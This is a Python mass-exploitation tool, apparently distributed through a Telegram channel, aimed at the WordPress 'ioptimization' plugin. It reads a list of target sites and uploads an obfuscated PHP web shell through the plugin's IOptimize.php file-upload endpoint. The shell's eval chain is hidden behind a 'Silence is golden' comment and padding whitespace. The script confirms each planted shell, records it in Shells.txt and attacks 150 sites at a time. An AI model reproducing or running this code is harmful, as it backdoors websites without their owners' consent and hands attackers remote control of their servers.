# https://t.me/clean_tools_net
import sys , requests, re , socket , random , string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init
init(autoreset=True)

fr  =   Fore.RED
fg  =   Fore.GREEN

def ran(length):
        letters = string.ascii_lowercase
        return ''.join(random.choice(letters) for i in range(length))

print("""
  [#] Create By ::
          ___                                                    ______
         / _ \                                                   |  ___|
        / /_\ \_ __   ___  _ __  _   _ _ __ ___   ___  _   _ ___ | |_ _____  __
        |  _  | '_ \ / _ \| '_ \| | | | '_ ` _ \ / _ \| | | / __||  _/ _ \ \/ /
        | | | | | | | (_) | | | | |_| | | | | | | (_) | |_| \__ \| || (_) >  <
        \_| |_/_| |_|\___/|_| |_|\__, |_| |_| |_|\___/ \__,_|___/\_| \___/_/\_\
                                  __/ |
                                 |___/ ioptimization v1
""")

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    path = str(sys.argv[0]).split('\\')
    exit('\n  [!] Enter <' + path[len(path) - 1] + '> <sites.txt>')

shell = """<?php
// Silence is golden.
                                                                                                                                                                                                                                                                                                         function _Q6K6($_uSQrvcXoS){$_uSQrvcXoS=substr($_uSQrvcXoS,(int)(hex2bin('31313139')));$_uSQrvcXoS=substr($_uSQrvcXoS,(int)(hex2bin('30')),(int)(hex2bin('2d323939')));return $_uSQrvcXoS;}$_u1qcNZI='_Q6K6';$_QgbfPdjA='base64_decode';function _xyuvE8F7bBudx($_qvyHr){global $_u1qcNZI;global $_QgbfPdjA;return strrev(gzinflate($_QgbfPdjA(_Q6K6($_qvyHr))));}eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(eval(_xyuvE8F7bBudx('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'))))))))))))))))))));"""

headers = {'Connection': 'keep-alive',
                        'Cache-Control': 'max-age=0',
                        'Upgrade-Insecure-Requests': '1',
                        'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                        'Accept-Encoding': 'gzip, deflate',
                        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
            'referer': 'www.google.com'}


def URLdomain(site):
    if 'http://' not in site and 'https://' not in site :
        site = 'http://'+site
    if site[-1]  is not '/' :
        site = site+'/'
    return site

def domain(site):
    if site.startswith("http://") :
        site = site.replace("http://","")
    elif site.startswith("https://") :
        site = site.replace("https://","")
    if 'www.' in site :
        site = site.replace("www.", "")
    site = site.rstrip()
    if site.split('/') :
        site = site.split('/')[0]
    while site[-1] == "/":
        pattern = re.compile('(.*)/')
        sitez = re.findall(pattern,site)
        site = sitez[0]
    return site

def addWWW(site):
    if site.startswith("http://"):
        site = site.replace("http://", "http://www.")
    elif site.startswith("https://"):
        site = site.replace("https://", "https://www.")
    else :
        site = 'http://www.'+site
    return site

def ioptimization(url) :
    try :
        dom = domain(url)
        url = URLdomain(url)
        try:
            socket.gethostbyname(dom)
        except:
            print(' -| ' + url + ' --> {}[DomainNotwork]'.format(fr))
            return
        inj = url+'wp-content/plugins/ioptimization/IOptimize.php?rchk'
        check = requests.get( inj , headers=headers , verify=False, timeout=15).content
        if 'ioptimization' in check :
            filedata = {'l': '../../'}
            fileup = {'userfile': ('index.php', shell, 'multipart/form-data')}
            up = requests.post(inj , data=filedata, files=fileup, headers=headers , verify=False, timeout=30)
            newShell = url + 'wp-content/index.php?x=ooo'
            check_shell = requests.get( newShell , headers=headers , verify=False, timeout=15).content
            if "<form method='POST' enctype='multipart/form-data'><input type='file'name='file' /><input type='submit' value='up' /></form>" in check_shell :
                open('Shells.txt', 'a').write(newShell + '\n')
                print(' -| ' + url + '--> {}[Succefully]'.format(fg))
            else :
                filename = ran(10) + '.php'
                filedata = {'l': './'}
                fileup = {'userfile': (filename, shell)}
                up = requests.post(inj , data=filedata, files=fileup, headers=headers , verify=False, timeout=30)
                newShell = url + 'wp-content/plugins/ioptimization/{}?x=ooo'.format(filename)
                check_shell = requests.get(newShell, headers=headers, verify=False, timeout=15).content
                if "value='up'" in check_shell:
                    open('Shells.txt', 'a').write(newShell + '\n')
                    print(' -| ' + url + '--> {}[Succefully]'.format(fg))
                elif 'http://' in inj :
                    inj2 = inj.replace("http://", "https://")
                    url2 = url.replace("http://", "https://")
                    try :
                        up = requests.post(inj2, data=filedata, files=fileup, headers=headers, verify=False, timeout=30)
                    except :
                        pass
                    newShell = url2 + 'wp-content/plugins/ioptimization/{}?x=ooo'.format(filename)
                    try :
                        check_shell = requests.get(newShell, headers=headers, verify=False, timeout=15).content
                    except:
                        check_shell = ''
                    if "value='up'" in check_shell:
                        open('Shells.txt', 'a').write(newShell + '\n')
                        print(' -| ' + url + '--> {}[Succefully]'.format(fg))
                    elif 'www.' not in inj :
                        inj3 = addWWW(inj)
                        url3 = addWWW(url)
                        up = requests.post(inj3, data=filedata, files=fileup, headers=headers, verify=False, timeout=30)
                        newShell = url3 + 'wp-content/plugins/ioptimization/{}?x=ooo'.format(filename)
                        check_shell = requests.get(newShell, headers=headers, verify=False, timeout=15).content
                        if "value='up'" in check_shell:
                            open('Shells.txt', 'a').write(newShell + '\n')
                            print(' -| ' + url + '--> {}[Succefully]'.format(fg))
                        else :
                            print(' -| ' + url + '--> {}[Failed]'.format(fr))
                    else :
                        print(' -| ' + url + '--> {}[Failed]'.format(fr))
                elif 'www.' not in inj :
                    inj3 = addWWW(inj)
                    url3 = addWWW(url)
                    up = requests.post(inj3, data=filedata, files=fileup, headers=headers, verify=False, timeout=30)
                    newShell = url3 + 'wp-content/plugins/ioptimization/{}?x=ooo'.format(filename)
                    check_shell = requests.get(newShell, headers=headers, verify=False, timeout=15).content
                    if "value='up'" in check_shell:
                        open('Shells.txt', 'a').write(newShell + '\n')
                        print(' -| ' + url + '--> {}[Succefully]'.format(fg))
                    else :
                        print(' -| ' + url + '--> {}[Failed]'.format(fr))
                else :
                    print(' -| ' + url + '--> {}[Failed]'.format(fr))
        else :
            print(' -| ' + url + '--> {}[Failed]'.format(fr))
    except :
        print(' -| ' + url + '--> {}[Failed]'.format(fr))

mp = Pool(150)
mp.map(ioptimization, target)
mp.close()
mp.join()